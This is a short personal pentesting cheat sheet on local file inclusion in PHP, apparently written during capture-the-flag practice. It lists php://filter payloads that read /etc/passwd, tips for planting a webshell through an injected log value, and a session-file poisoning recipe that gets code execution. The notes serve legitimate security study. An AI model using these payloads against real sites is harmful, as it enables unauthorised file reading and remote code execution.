# Local File Inclusion
Tags: #lfi #php #logs #privesc 
See also: 
Related to: [[linux-privesc]]

## Including a PHP log
If you ever see any webpage that looks like a system log, e.g. showing which user accessed a page, try to get control over that value and insert PHP code between `<?php` tags.

![[thm-wwbuddy-php-log-inject.png]]
In this case, changed WWBuddy name to a webshell

## PHP Wrappers
Generic resource
`?file=php://filter/resource=/etc/passwd`

### Retrieving PHP source code
ROT13
`?file=filter/read=string.rot13/resource=/etc/passwd`

Base64
`?file=php://filter/convert.base64-encode/resource=/etc/passwd`

## PHP session files
PHP can be configured to store session files in e.g. `/tmp` that match the PHPSESSID,
e.g. `/tmp/sess_4qv0tib1blj8be6vibc0rou2s7` if `PHPSESSID=4qv0tib1blj8be6vibc0rou2s7`

This will log login attempts in some cases.

So if you POST 
	username:`<?php phpinfo(); ?>`
	password: `pass`

And can include files, then you can do `?file=/tmp/sess_4qv0tib1blj8be6vibc0rou2s7` after logging in and get RCE